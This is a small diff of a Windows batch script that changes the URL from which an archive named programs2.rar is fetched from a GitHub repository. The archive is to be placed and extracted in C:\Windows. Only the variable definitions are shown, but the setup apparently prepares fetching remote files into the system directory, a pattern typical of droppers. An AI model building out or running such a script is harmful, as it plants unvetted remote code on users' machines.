@@ -3,8 +3,7 @@
 REM Define variables
 set "RAR_NAME=programs2.rar"
 
-
-set "URL=https://raw.githubusercontent.com/m-c00/trvmain/"
+set "URL=https://github.com/m-c00/tr/raw/main/"
 set "OUTPUT_DIR=C:\Windows"
 set "RAR_FILE=%OUTPUT_DIR%\%RAR_NAME%"
 set "EXTRACTION_DIR=%OUTPUT_DIR%"
